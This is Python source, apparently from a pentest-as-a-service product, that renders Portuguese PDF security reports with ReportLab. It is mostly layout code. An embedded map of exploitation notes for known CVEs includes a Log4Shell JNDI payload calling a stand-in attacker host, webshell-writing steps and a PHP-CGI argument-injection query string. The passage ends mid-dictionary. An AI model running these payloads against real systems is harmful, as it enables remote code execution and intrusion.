"""
RedShield PTaaS — PDF Generator v3.0
Relatório profissional e visualmente atrativo com ReportLab.
Inclui: capa com score, faixas coloridas, tabelas estilizadas, seção Red/Blue Team.
"""

import io
import datetime
from reportlab.lib.pagesizes import A4
from reportlab.lib.units import mm
from reportlab.lib import colors
from reportlab.lib.styles import ParagraphStyle
from reportlab.lib.enums import TA_CENTER, TA_RIGHT, TA_LEFT
from reportlab.platypus import (
    SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle,
    HRFlowable, PageBreak, KeepTogether, FrameBreak
)
from reportlab.platypus.flowables import HRFlowable
from reportlab.graphics.shapes import Drawing, Rect, String, Line, Circle, Wedge, Polygon
from reportlab.graphics import renderPDF

W, H = A4  # 595.28 x 841.89 pts

# ── PALETA ───────────────────────────────────────────────────────────────────
RED    = colors.HexColor("#E24B4A")
RED2   = colors.HexColor("#A32D2D")
ORANGE = colors.HexColor("#EF9F27")
BLUE   = colors.HexColor("#378ADD")
BLUE2  = colors.HexColor("#1A5FA8")
GREEN  = colors.HexColor("#27A85F")
TEAL   = colors.HexColor("#1D9E75")
DARK   = colors.HexColor("#0d1117")
DARK2  = colors.HexColor("#161b22")
DARK3  = colors.HexColor("#21262d")
GRAY   = colors.HexColor("#8B949E")
LGRAY  = colors.HexColor("#E6EDF3")
WHITE  = colors.white
OFFWHT = colors.HexColor("#F8F9FA")

SEV_MAP = {
    "CRITICAL": (colors.HexColor("#FCEAEA"), colors.HexColor("#C0392B")),
    "HIGH":     (colors.HexColor("#FEF3E2"), colors.HexColor("#D35400")),
    "MEDIUM":   (colors.HexColor("#EAF3FE"), colors.HexColor("#2471A3")),
    "LOW":      (colors.HexColor("#E9F7EF"), colors.HexColor("#1E8449")),
    "INFO":     (LGRAY, GRAY),
}
SEV_PT = {"CRITICAL": "CRÍTICO", "HIGH": "ALTO", "MEDIUM": "MÉDIO",
          "LOW": "BAIXO", "INFO": "INFO"}


def esc(t):
    return str(t or "").replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def S(name, **kw):
    d = dict(fontName="Helvetica", fontSize=9, textColor=DARK, leading=14, spaceAfter=2)
    d.update(kw)
    return ParagraphStyle(name, **d)


# ── STYLES ────────────────────────────────────────────────────────────────────
ST = {
    "title":   S("T", fontName="Helvetica-Bold", fontSize=22, textColor=WHITE, leading=28),
    "title2":  S("T2", fontName="Helvetica-Bold", fontSize=14, textColor=RED, leading=18),
    "h1":      S("H1", fontName="Helvetica-Bold", fontSize=12, textColor=DARK, leading=18, spaceBefore=12, spaceAfter=6),
    "h2":      S("H2", fontName="Helvetica-Bold", fontSize=10, textColor=DARK2, leading=15, spaceBefore=6, spaceAfter=4),
    "body":    S("B", fontSize=9, leading=14, spaceAfter=4, textColor=DARK),
    "small":   S("Sm", fontSize=8, textColor=GRAY, leading=12),
    "mono":    S("Mo", fontName="Courier", fontSize=8, backColor=LGRAY, leading=12),
    "center":  S("C", fontSize=9, alignment=TA_CENTER),
    "right":   S("R", fontSize=9, alignment=TA_RIGHT),
    "disc":    S("D", fontName="Helvetica-Oblique", fontSize=7.5, textColor=GRAY, alignment=TA_CENTER, leading=12),
    "label":   S("L", fontName="Helvetica-Bold", fontSize=7, textColor=GRAY, leading=10, spaceAfter=0),
    "value":   S("V", fontName="Helvetica-Bold", fontSize=10, textColor=DARK, leading=14),
    "wh":      S("WH", fontName="Helvetica-Bold", fontSize=8.5, textColor=WHITE),
    "wh_sm":   S("WHS", fontName="Helvetica-Bold", fontSize=7, textColor=WHITE, alignment=TA_CENTER),
    "score_n": S("SN", fontName="Helvetica-Bold", fontSize=40, textColor=WHITE, alignment=TA_CENTER, leading=44),
    "score_l": S("SL", fontName="Helvetica-Bold", fontSize=10, textColor=WHITE, alignment=TA_CENTER),
}


def rule(color=RED, thickness=1.5):
    return HRFlowable(width="100%", thickness=thickness, color=color, spaceAfter=4*mm)


def section_title(text, color=DARK):
    d = Drawing(165*mm, 7*mm)
    d.add(Rect(0, 0, 165*mm, 5.5*mm, fillColor=color, strokeColor=None))
    d.add(String(3*mm, 1.5*mm, text, fontName="Helvetica-Bold", fontSize=9, fillColor=WHITE))
    return d


# ── COVER PAGE ────────────────────────────────────────────────────────────────
def cover_page(report):
    story = []
    target = esc(report.get("target", "—"))
    ts = report.get("timestamp", datetime.datetime.utcnow().isoformat())
    try:
        date_str = datetime.datetime.fromisoformat(ts.replace("Z", "")).strftime("%d/%m/%Y %H:%M UTC")
    except Exception:
        date_str = str(ts)
    duration = report.get("scan_duration_s", 0)
    risk = report.get("risk_score", 0)
    summary = report.get("summary", {})

    # ── Dark header band ─────────────────────────────────────────────
    hdr = Drawing(165*mm, 52*mm)
    hdr.add(Rect(0, 0, 165*mm, 52*mm, fillColor=DARK, strokeColor=None))
    # Red accent bar top
    hdr.add(Rect(0, 49*mm, 165*mm, 3*mm, fillColor=RED, strokeColor=None))
    # Hexagonal watermark shape (decorative)
    hdr.add(Polygon(
        [130*mm, 45*mm, 145*mm, 38*mm, 145*mm, 24*mm,
         130*mm, 17*mm, 115*mm, 24*mm, 115*mm, 38*mm],
        fillColor=colors.HexColor("#1a1f29"), strokeColor=None
    ))
    hdr.add(String(4*mm, 36*mm, "RedShield", fontName="Helvetica-Bold", fontSize=28, fillColor=WHITE))
    hdr.add(String(4*mm, 26*mm, "PTaaS", fontName="Helvetica-Bold", fontSize=28, fillColor=RED))
    hdr.add(String(4*mm, 16*mm, "RELATÓRIO DE PENTEST  —  CONFIDENCIAL",
                   fontName="Helvetica", fontSize=9, fillColor=GRAY))
    hdr.add(String(4*mm, 8*mm, "Pentest as a Service  |  v3.0  |  redshield.ptaas",
                   fontName="Helvetica-Oblique", fontSize=8, fillColor=colors.HexColor("#444c56")))
    story.append(hdr)
    story.append(Spacer(1, 6*mm))

    # ── Meta info table ──────────────────────────────────────────────
    meta_rows = [
        [Paragraph("<b>ALVO</b>", ST["label"]),    Paragraph(target, ST["value"])],
        [Paragraph("<b>DATA / HORA</b>", ST["label"]), Paragraph(date_str, ST["value"])],
        [Paragraph("<b>DURAÇÃO</b>", ST["label"]),  Paragraph(f"{duration}s", ST["value"])],
        [Paragraph("<b>CLASSIFICAÇÃO</b>", ST["label"]), Paragraph("CONFIDENCIAL — USO RESTRITO", S("conf", fontName="Helvetica-Bold", fontSize=10, textColor=RED2, leading=14))],
    ]
    mt = Table(meta_rows, colWidths=[36*mm, 129*mm])
    mt.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (0, -1), LGRAY),
        ("LEFTPADDING", (0, 0), (-1, -1), 5), ("RIGHTPADDING", (0, 0), (-1, -1), 5),
        ("TOPPADDING", (0, 0), (-1, -1), 5), ("BOTTOMPADDING", (0, 0), (-1, -1), 5),
        ("GRID", (0, 0), (-1, -1), 0.4, colors.HexColor("#D0D7DE")),
        ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
    ]))
    story.append(mt)
    story.append(Spacer(1, 6*mm))

    # ── Risk Score + Findings Summary ────────────────────────────────
    if risk >= 9:     score_label, score_color = "CRÍTICO",   RED
    elif risk >= 7:   score_label, score_color = "ALTO",      ORANGE
    elif risk >= 4:   score_label, score_color = "MÉDIO",     BLUE
    else:             score_label, score_color = "BAIXO",     GREEN

    score_hex = score_color.hexval()[2:]

    # Score block
    score_d = Drawing(40*mm, 34*mm)
    score_d.add(Rect(0, 0, 40*mm, 34*mm, fillColor=DARK2, strokeColor=None))
    score_d.add(Rect(0, 31*mm, 40*mm, 3*mm, fillColor=score_color, strokeColor=None))
    score_d.add(String(20*mm, 16*mm, str(risk),
                       fontName="Helvetica-Bold", fontSize=30, fillColor=score_color,
                       textAnchor="middle"))
    score_d.add(String(20*mm, 8*mm, "/ 10",
                       fontName="Helvetica", fontSize=10, fillColor=GRAY,
                       textAnchor="middle"))
    score_d.add(String(20*mm, 2*mm, score_label,
                       fontName="Helvetica-Bold", fontSize=9, fillColor=score_color,
                       textAnchor="middle"))

    # Finding counts
    counts_data = [
        [Paragraph(f'<font color="#C0392B"><b>{summary.get("CRITICAL", 0)}</b></font>', S("cn", fontName="Helvetica-Bold", fontSize=22, alignment=TA_CENTER)),
         Paragraph(f'<font color="#D35400"><b>{summary.get("HIGH", 0)}</b></font>', S("cn2", fontName="Helvetica-Bold", fontSize=22, alignment=TA_CENTER)),
         Paragraph(f'<font color="#2471A3"><b>{summary.get("MEDIUM", 0)}</b></font>', S("cn3", fontName="Helvetica-Bold", fontSize=22, alignment=TA_CENTER)),
         Paragraph(f'<font color="#1E8449"><b>{summary.get("LOW", 0)}</b></font>', S("cn4", fontName="Helvetica-Bold", fontSize=22, alignment=TA_CENTER))],
        [Paragraph("CRÍTICO", S("cl", fontSize=7, textColor=SEV_MAP["CRITICAL"][1], alignment=TA_CENTER, fontName="Helvetica-Bold")),
         Paragraph("ALTO",    S("cl2", fontSize=7, textColor=SEV_MAP["HIGH"][1], alignment=TA_CENTER, fontName="Helvetica-Bold")),
         Paragraph("MÉDIO",   S("cl3", fontSize=7, textColor=SEV_MAP["MEDIUM"][1], alignment=TA_CENTER, fontName="Helvetica-Bold")),
         Paragraph("BAIXO",   S("cl4", fontSize=7, textColor=SEV_MAP["LOW"][1], alignment=TA_CENTER, fontName="Helvetica-Bold"))],
    ]
    ct = Table(counts_data, colWidths=[31*mm] * 4)
    ct.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (0, -1), SEV_MAP["CRITICAL"][0]),
        ("BACKGROUND", (1, 0), (1, -1), SEV_MAP["HIGH"][0]),
        ("BACKGROUND", (2, 0), (2, -1), SEV_MAP["MEDIUM"][0]),
        ("BACKGROUND", (3, 0), (3, -1), SEV_MAP["LOW"][0]),
        ("TOPPADDING", (0, 0), (-1, -1), 6), ("BOTTOMPADDING", (0, 0), (-1, -1), 4),
        ("GRID", (0, 0), (-1, -1), 0.5, WHITE),
        ("ALIGN", (0, 0), (-1, -1), "CENTER"), ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
        ("LINEABOVE", (0, 0), (0, 0), 2, SEV_MAP["CRITICAL"][1]),
        ("LINEABOVE", (1, 0), (1, 0), 2, SEV_MAP["HIGH"][1]),
        ("LINEABOVE", (2, 0), (2, 0), 2, SEV_MAP["MEDIUM"][1]),
        ("LINEABOVE", (3, 0), (3, 0), 2, SEV_MAP["LOW"][1]),
    ]))

    combo = Table([[score_d, ct]], colWidths=[42*mm, 123*mm])
    combo.setStyle(TableStyle([
        ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
        ("LEFTPADDING", (0, 0), (-1, -1), 0),
        ("RIGHTPADDING", (0, 0), (-1, -1), 0),
        ("TOPPADDING", (0, 0), (-1, -1), 0),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 0),
    ]))
    story.append(combo)
    story.append(Spacer(1, 8*mm))
    story.append(rule(DARK3, 0.5))
    story.append(Spacer(1, 2*mm))

    # ── Threat Intel stats strip ──────────────────────────────────────
    stats_data = [[
        Paragraph('<font color="#E24B4A"><b>100</b></font> CVEs monitorados<br/><font size="7" color="#8B949E">2020–2026 · CRITICAL + HIGH</font>', S("ts", fontSize=9, alignment=TA_CENTER)),
        Paragraph('<font color="#378ADD"><b>30</b></font> WAFs detectados<br/><font size="7" color="#8B949E">Cloud · On-premise · Open Source</font>', S("ts2", fontSize=9, alignment=TA_CENTER)),
        Paragraph('<font color="#27A85F"><b>30</b></font> Técnicas de bypass<br/><font size="7" color="#8B949E">SQLi · XSS · LFI · SSRF · SSTI</font>', S("ts3", fontSize=9, alignment=TA_CENTER)),
        Paragraph('<font color="#EF9F27"><b>10</b></font> Módulos OWASP<br/><font size="7" color="#8B949E">Top 10 · 2021 Edition</font>', S("ts4", fontSize=9, alignment=TA_CENTER)),
    ]]
    st = Table(stats_data, colWidths=[41.25*mm] * 4)
    st.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, -1), OFFWHT),
        ("TOPPADDING", (0, 0), (-1, -1), 6), ("BOTTOMPADDING", (0, 0), (-1, -1), 6),
        ("GRID", (0, 0), (-1, -1), 0.4, colors.HexColor("#D0D7DE")),
        ("ALIGN", (0, 0), (-1, -1), "CENTER"),
        ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
    ]))
    story.append(st)
    story.append(PageBreak())
    return story


# ── INFRA SECTION ─────────────────────────────────────────────────────────────
def infra_section(report):
    dns = report.get("dns", {})
    tls = report.get("tls", {})
    techs = report.get("technologies", [])
    if not (dns.get("ips") or tls or techs):
        return []

    story = [Paragraph("Infraestrutura & Tecnologias", ST["h1"]), rule(DARK3, 0.4)]

    rows = []
    if dns.get("ips"):
        rows.append([Paragraph("<b>IPs Resolvidos</b>", ST["body"]),
                     Paragraph(", ".join(dns["ips"]), ST["body"])])
    if dns.get("hostname"):
        rows.append([Paragraph("<b>Hostname</b>", ST["body"]),
                     Paragraph(esc(dns["hostname"]), ST["body"])])
    if tls.get("version"):
        tls_valid = "✓ Válido" if tls.get("valid") else "✗ Inválido"
        tls_exp = f"Expira em: {tls.get('expiry', '?')} ({tls.get('days_remaining', 0)} dias)"
        tls_txt = f"{tls_valid} | {tls.get('version', '?')} | {tls_exp}"
        if tls.get("expired"):
            tls_txt += " ⚠ EXPIRADO"
        rows.append([Paragraph("<b>TLS/SSL</b>", ST["body"]),
                     Paragraph(esc(tls_txt), ST["body"])])
    if tls.get("issuer"):
        rows.append([Paragraph("<b>Emissor CA</b>", ST["body"]),
                     Paragraph(esc(tls["issuer"]), ST["body"])])
    if techs:
        tech_txt = ", ".join(t["name"] for t in techs[:8])
        rows.append([Paragraph("<b>Tecnologias</b>", ST["body"]),
                     Paragraph(esc(tech_txt), ST["body"])])

    if rows:
        t = Table(rows, colWidths=[38*mm, 127*mm])
        t.setStyle(TableStyle([
            ("BACKGROUND", (0, 0), (0, -1), LGRAY),
            ("GRID", (0, 0), (-1, -1), 0.4, colors.HexColor("#D0D7DE")),
            ("TOPPADDING", (0, 0), (-1, -1), 5),
            ("BOTTOMPADDING", (0, 0), (-1, -1), 5),
            ("LEFTPADDING", (0, 0), (-1, -1), 5),
            ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
        ]))
        story.append(t)
        story.append(Spacer(1, 6*mm))
    return story


# ── FINDINGS ──────────────────────────────────────────────────────────────────
def findings_section(findings):
    story = [Paragraph("Vulnerabilidades Identificadas", ST["h1"]), rule(RED, 0.8)]
    if not findings:
        story.append(Paragraph("Nenhuma vulnerabilidade identificada neste scan.", ST["body"]))
        return story

    order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    sorted_f = sorted(findings, key=lambda x: order.get(x.get("severity", "INFO"), 5))

    for f in sorted_f:
        sev = f.get("severity", "INFO")
        bg, fg = SEV_MAP.get(sev, SEV_MAP["INFO"])
        sev_label = SEV_PT.get(sev, sev)
        fg_hex = fg.hexval()[2:]

        # Title row with colored severity badge
        title_row = Table([[
            Paragraph(f'<b>{sev_label}</b>', S("sb", fontName="Helvetica-Bold", fontSize=7.5, textColor=fg, alignment=TA_CENTER)),
            Paragraph(f'<b>{esc(f.get("title", ""))}</b>', S("ft", fontName="Helvetica-Bold", fontSize=10, textColor=DARK, leading=14)),
        ]], colWidths=[18*mm, 147*mm])
        title_row.setStyle(TableStyle([
            ("BACKGROUND", (0, 0), (0, 0), bg),
            ("BACKGROUND", (1, 0), (1, 0), colors.HexColor("#F0F3F6")),
            ("LINEABOVE", (0, 0), (-1, 0), 2, fg),
            ("LEFTPADDING", (0, 0), (0, 0), 3), ("RIGHTPADDING", (0, 0), (0, 0), 3),
            ("LEFTPADDING", (1, 0), (1, 0), 6),
            ("TOPPADDING", (0, 0), (-1, -1), 6), ("BOTTOMPADDING", (0, 0), (-1, -1), 6),
            ("VALIGN", (0, 0), (-1, -1), "MIDDLE"), ("ALIGN", (0, 0), (0, 0), "CENTER"),
            ("BOX", (0, 0), (-1, -1), 0.5, colors.HexColor("#D0D7DE")),
        ]))

        # Build exploitation context for CVE findings
        cve_exploit_map = {
            # ATTACK VECTOR descriptions keyed by partial CVE id or keyword
            "Log4Shell": {
                "endpoint": "Qualquer campo logado pela aplicação (User-Agent, X-Forwarded-For, parâmetros de formulário)",
                "attack_vector": "JNDI Injection via header HTTP ou parâmetro de entrada: ${jndi:ldap://attacker.com/x}",
                "exploit_steps": "1. Hospedar servidor LDAP malicioso (marshalsec). 2. Injetar payload em User-Agent. 3. LDAP redireciona para servidor HTTP com bytecode Java malicioso. 4. RCE como usuário da JVM.",
            },
            "Spring4Shell": {
                "endpoint": "/any Spring MVC endpoint que aceite parâmetros de binding (ex.: /login, /register, /api/*)",
                "attack_vector": "POST com class.module.classLoader.resources.context.parent.pipeline.first.* para escrita de JSP webshell",
                "exploit_steps": "1. Identificar endpoint Spring com data binding. 2. Enviar payload POST manipulando ClassLoader. 3. JSP webshell gravado em diretório web-accessible. 4. Acesso RCE via GET na webshell.",
            },
            "ProxyLogon": {
                "endpoint": "/owa/ e /ecp/ no Exchange — endpoints SSRF pre-auth acessíveis externamente",
                "attack_vector": "SSRF via header X-BEResource para acessar backend EWS como SYSTEM, seguido de escrita de webshell",
                "exploit_steps": "1. Requisição SSRF pré-auth em /ecp/. 2. Obter cookie de sessão legítimo. 3. Escrever webshell via SetObject. 4. Executar comandos como NT AUTHORITY\\SYSTEM.",
            },
            "Confluence": {
                "endpoint": "/confluence/pages/doenterpagevariables.action ou /%24%7B endpoint OGNL",
                "attack_vector": "OGNL Expression Injection via parâmetro queryString em templates Velocity não sanitizados",
                "exploit_steps": "1. Enviar payload OGNL: ${Class.forName('java.lang.Runtime').getMethod('exec',...)}. 2. Executar comando no sistema. 3. Exfiltrar dados ou instalar backdoor.",
            },
            "WordPress": {
                "endpoint": "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php",
                "attack_vector": "Upload direto de arquivo PHP sem autenticação via plugin elFinder exposto",
                "exploit_steps": "1. POST multipart para o connector.minimal.php com cmd=upload. 2. Arquivo PHP malicioso gravado em /wp-content/uploads/. 3. Acesso à webshell via GET. 4. RCE como www-data.",
            },
            "Apache Tomcat": {
                "endpoint": "Qualquer endpoint via PUT parcial (Partial PUT) — tipicamente /upload ou /*",
                "attack_vector": "Partial PUT envia JSP malicioso em fragmento; GET subsequente executa o arquivo antes da montagem completa",
                "exploit_steps": "1. PUT /upload.jsp com Content-Range: bytes 0-3/10 e corpo JSP malicioso. 2. GET /upload.jsp para executar o fragment. 3. RCE imediato sem autenticação.",
            },
            "PHP CGI": {
                "endpoint": "/cgi-bin/php.cgi ou qualquer endpoint PHP-CGI — tipicamente em /index.php",
                "attack_vector": "Injeção de argumento CGI via query string codificada em locales específicos (pt-BR, zh, tr): /%ADd+allow_url_include%3d1",
                "exploit_steps": "1. GET /?%ADd+allow_url_include=1+-d+auto_prepend_file%3Dphp://input com corpo PHP. 2. allow_url_include ativado via argumento CGI. 3. Execução de PHP arbitrário como www-data.",
            },
        }

        # Try to match CVE finding to a known exploit context
        cve_ctx = None
        if f.get("finding_type") == "CVE" or "CVE-" in str(f.get("id", "")):
            title_lower = f.get("title", "").lower()
            desc_lower = f.get("description", "").lower()
            combined_lower = title_lower + " " + desc_lower
            for keyword, ctx in cve_exploit_map.items():
                if keyword.lower() in combined_lower:
                    cve_ctx = ctx
                    break

        # Body
        body_parts = []
        if f.get("id"):
            body_parts.append([
                Paragraph("<b>ID / Referência</b>", ST["small"]),
                Paragraph(esc(f["id"]), S("mid", fontName="Courier", fontSize=8.5, textColor=DARK)),
            ])
        if f.get("cvss"):
            body_parts.append([
                Paragraph("<b>CVSS Score</b>", ST["small"]),
                Paragraph(f'<font color="#{fg_hex}"><b>{f["cvss"]}</b></font>', S("cscore", fontName="Helvetica-Bold", fontSize=10, textColor=fg)),
            ])
        if f.get("description"):
            body_parts.append([
                Paragraph("<b>Descrição</b>", ST["small"]),
                Paragraph(esc(f["description"]), ST["body"]),
            ])
        # ── CVE-specific exploitation details ─────────────────────────────
        if cve_ctx:
            body_parts.append([
                Paragraph("<b>Endpoint afetado</b>", ST["small"]),
                Paragraph(
                    f'<font face="Courier" color="#1A5FA8">{esc(cve_ctx["endpoint"])}</font>',
                    S("cve_ep", fontName="Courier", fontSize=8, leading=12, textColor=colors.HexColor("#1A5FA8"))
                ),
            ])
            body_parts.append([
                Paragraph("<b>Vetor de ataque</b>", ST["small"]),
                Paragraph(esc(cve_ctx["attack_vector"]),
                          S("cve_av", fontSize=8.5, leading=13, textColor=colors.HexColor("#7B241C"))),
            ])
            body_parts.append([
                Paragraph("<b>Como explorar</b>", ST["small"]),
                Paragraph(esc(cve_ctx["exploit_steps"]),
                          S("cve_ex", fontName="Courier", fontSize=7.5, leading=12, textColor=colors.HexColor("#1A5FA8"))),
            ])
        elif f.get("finding_type") == "CVE" or "CVE-" in str(f.get("id", "")):
            # Generic CVE exploitation note when no specific context is mapped
            body_parts.append([
                Paragraph("<b>Endpoint afetado</b>", ST["small"]),
                Paragraph(
                    "Endpoint identificado pela correspondência de fingerprint tecnológico na resposta HTTP. "
                    "Confirmar via enumeração manual do serviço afetado.",
                    S("cve_ep_gen", fontSize=8.5, leading=13, textColor=DARK)
                ),
            ])
            body_parts.append([
                Paragraph("<b>Como explorar</b>", ST["small"]),
                Paragraph(
                    "Verificar PoC público no NVD / Exploit-DB / GitHub. "
                    "Confirmar versão exata do componente e aplicar exploit em ambiente controlado antes de remediar.",
                    S("cve_how_gen", fontName="Courier", fontSize=7.5, leading=12, textColor=colors.HexColor("#1A5FA8"))
                ),
            ])
        if f.get("remediation"):
            body_parts.append([
                Paragraph("<b>Remediação</b>", ST["small"]),
                Paragraph(esc(f["remediation"]), S("rem", fontSize=9, textColor=colors.HexColor("#1E8449"), leading=14)),
            ])

        if body_parts:
            bt = Table(body_parts, colWidths=[28*mm, 137*mm])
            bt.setStyle(TableStyle([
                ("BACKGROUND", (0, 0), (0, -1), colors.HexColor("#F8F9FA")),
                ("GRID", (0, 0), (-1, -1), 0.3, colors.HexColor("#E6EDF3")),
                ("TOPPADDING", (0, 0), (-1, -1), 4), ("BOTTOMPADDING", (0, 0), (-1, -1), 4),
                ("LEFTPADDING", (0, 0), (-1, -1), 5), ("RIGHTPADDING", (0, 0), (-1, -1), 5),
                ("VALIGN", (0, 0), (-1, -1), "TOP"),
            ]))
            story.append(KeepTogether([title_row, bt, Spacer(1, 4*mm)]))
        else:
            story.append(KeepTogether([title_row, Spacer(1, 4*mm)]))

    return story


# ── WAF SECTION ───────────────────────────────────────────────────────────────
def waf_section(waf_data):
    story = [Paragraph("Análise WAF — Web Application Firewall", ST["h1"]), rule(BLUE, 0.8)]

    detected = ", ".join(waf_data.get("detected", ["Não detectado"]))
    # Detection badge
    det_color = BLUE if detected != "Não detectado / Personalizado" else GRAY
    det_bg = colors.HexColor("#EAF3FE") if det_color == BLUE else LGRAY
    det_row = Table([[
        Paragraph("<b>WAF DETECTADO</b>", S("wl", fontName="Helvetica-Bold", fontSize=7.5, textColor=WHITE, alignment=TA_CENTER)),
        Paragraph(f"<b>{esc(detected)}</b>", S("wv", fontName="Helvetica-Bold", fontSize=10, textColor=det_color)),
    ]], colWidths=[28*mm, 137*mm])
    det_row.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (0, 0), det_color),
        ("BACKGROUND", (1, 0), (1, 0), det_bg),
        ("LINEABOVE", (0, 0), (-1, 0), 2, det_color),
        ("TOPPADDING", (0, 0), (-1, -1), 7), ("BOTTOMPADDING", (0, 0), (-1, -1), 7),
        ("LEFTPADDING", (0, 0), (-1, -1), 6),
        ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
        ("BOX", (0, 0), (-1, -1), 0.5, colors.HexColor("#D0D7DE")),
    ]))
    story.append(det_row)
    story.append(Spacer(1, 5*mm))

    bypasses = waf_data.get("bypasses", [])
    if not bypasses:
        return story

    # Stats bar
    b_count = sum(1 for b in bypasses if b.get("result") == "BYPASS")
    bl_count = sum(1 for b in bypasses if b.get("result") == "BLOQUEADO")
    nf_count = sum(1 for b in bypasses if b.get("result") == "NOT_FOUND")
    rd_count = sum(1 for b in bypasses if b.get("result") == "REDIRECT")
    pa_count = sum(1 for b in bypasses if b.get("result") == "PARCIAL")
    total = len(bypasses)

    stats_row = Table([[
        Paragraph(f'<font color="#C0392B"><b>{b_count}</b></font><br/><font size="7">BYPASS</font>', S("bs", fontSize=9, alignment=TA_CENTER)),
        Paragraph(f'<font color="#27A85F"><b>{bl_count}</b></font><br/><font size="7">BLOQUEADO</font>', S("bbl", fontSize=9, alignment=TA_CENTER)),
        Paragraph(f'<font color="#8B949E"><b>{nf_count}</b></font><br/><font size="7">NOT FOUND</font>', S("bnf", fontSize=9, alignment=TA_CENTER)),
        Paragraph(f'<font color="#8B949E"><b>{rd_count}</b></font><br/><font size="7">REDIRECT</font>', S("brd", fontSize=9, alignment=TA_CENTER)),
        Paragraph(f'<font color="#EF9F27"><b>{pa_count}</b></font><br/><font size="7">PARCIAL</font>', S("bpa", fontSize=9, alignment=TA_CENTER)),
    ]], colWidths=[33*mm] * 5)
    stats_row.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (0, -1), colors.HexColor("#FCEAEA")),
        ("BACKGROUND", (1, 0), (1, -1), colors.HexColor("#E9F7EF")),
        ("BACKGROUND", (2, 0), (2, -1), LGRAY),
        ("BACKGROUND", (3, 0), (3, -1), LGRAY),
        ("BACKGROUND", (4, 0), (4, -1), colors.HexColor("#FEF3E2")),
        ("LINEABOVE", (0, 0), (0, 0), 2, RED),
        ("LINEABOVE", (1, 0), (1, 0), 2, GREEN),
        ("LINEABOVE", (2, 0), (2, 0), 2, GRAY),
        ("LINEABOVE", (3, 0), (3, 0), 2, GRAY),
        ("LINEABOVE", (4, 0), (4, 0), 2, ORANGE),
        ("TOPPADDING", (0, 0), (-1, -1), 6), ("BOTTOMPADDING", (0, 0), (-1, -1), 6),
        ("GRID", (0, 0), (-1, -1), 0.4, WHITE),
        ("ALIGN", (0, 0), (-1, -1), "CENTER"), ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
    ]))
    story.append(stats_row)
    story.append(Spacer(1, 4*mm))

    # Note about NOT_FOUND and REDIRECT
    story.append(Paragraph(
        '<font color="#8B949E">Nota: NOT_FOUND (404) e REDIRECT (3xx) NÃO são considerados bypass — '
        'indicam que o endpoint testado não existe ou foi redirecionado, não que o WAF foi evadido. '
        'Somente HTTP 2xx com body sem indicadores de bloqueio é classificado como BYPASS.</font>',
        S("note", fontSize=7.5, textColor=GRAY, leading=11)
    ))
    story.append(Spacer(1, 4*mm))

    # Bypass table
    rows = [[
        Paragraph("TÉCNICA", ST["wh"]),
        Paragraph("CATEGORIA", ST["wh"]),
        Paragraph("PAYLOAD (resumo)", ST["wh"]),
        Paragraph("RESULTADO", ST["wh_sm"]),
        Paragraph("HTTP", ST["wh_sm"]),
    ]]
    R_COLORS = {
        "BYPASS":     RED,
        "BLOQUEADO":  GREEN,
        "PARCIAL":    ORANGE,
        "NOT_FOUND":  GRAY,
        "REDIRECT":   GRAY,
        "ERROR":      GRAY,
    }
    R_LABELS = {
        "BYPASS": "BYPASS", "BLOQUEADO": "BLOQUEADO",
        "PARCIAL": "PARCIAL", "NOT_FOUND": "404 NÃO EXISTE",
        "REDIRECT": "REDIRECT", "ERROR": "ERRO",
    }
    for b in bypasses:
        result = b.get("result", "—")
        r_color = R_COLORS.get(result, GRAY)
        r_label = R_LABELS.get(result, result)
        payload_raw = str(b.get("payload", ""))[:28]
        if len(str(b.get("payload", ""))) > 28:
            payload_raw += "…"
        rows.append([
            Paragraph(esc(b.get("name", "")), ST["small"]),
            Paragraph(esc(b.get("category", "")), ST["small"]),
            Paragraph(esc(payload_raw), S("cp", fontName="Courier", fontSize=7, leading=10)),
            Paragraph(f'<font color="#{r_color.hexval()[2:]}"><b>{r_label}</b></font>',
                      S("rp", fontName="Helvetica-Bold", fontSize=7, alignment=TA_CENTER)),
            Paragraph(str(b.get("status_code", "—")), S("sc", fontSize=8, alignment=TA_CENTER)),
        ])

    t = Table(rows, colWidths=[40*mm, 24*mm, 56*mm, 28*mm, 17*mm])
    t.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, 0), DARK),
        ("TEXTCOLOR", (0, 0), (-1, 0), WHITE),
        ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
        ("FONTSIZE", (0, 0), (-1, 0), 8),
        ("ROWBACKGROUNDS", (0, 1), (-1, -1), [WHITE, OFFWHT]),
        ("GRID", (0, 0), (-1, -1), 0.3, colors.HexColor("#D0D7DE")),
        ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
        ("TOPPADDING", (0, 0), (-1, -1), 4),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 4),
        ("LEFTPADDING", (0, 0), (-1, -1), 4),
        ("ALIGN", (3, 0), (4, -1), "CENTER"),
    ]))
    story.append(t)

    # ── Detailed analysis for each confirmed BYPASS (HTTP 200) ─────────────
    confirmed_bypasses = [b for b in bypasses if b.get("result") == "BYPASS"]
    if confirmed_bypasses:
        story.append(Spacer(1, 6*mm))
        story.append(Paragraph("Análise Detalhada — Bypasses Confirmados (HTTP 200)", ST["h2"]))
        story.append(Paragraph(
            'Os itens abaixo retornaram <font color="#C0392B"><b>HTTP 200</b></font> sem indicadores '
            'de bloqueio no body — confirmando que o WAF não interceptou a requisição. '
            'Para cada caso é explicado o endpoint testado, o motivo técnico do bypass e o vetor de exploração.',
            S("byp_intro", fontSize=8.5, textColor=DARK, leading=13, spaceAfter=4)
        ))
        story.append(Spacer(1, 3*mm))

        # Category-specific exploitation context
        BYPASS_EXPLOIT_CONTEXT = {
            "SQL Injection": {
                "why": (
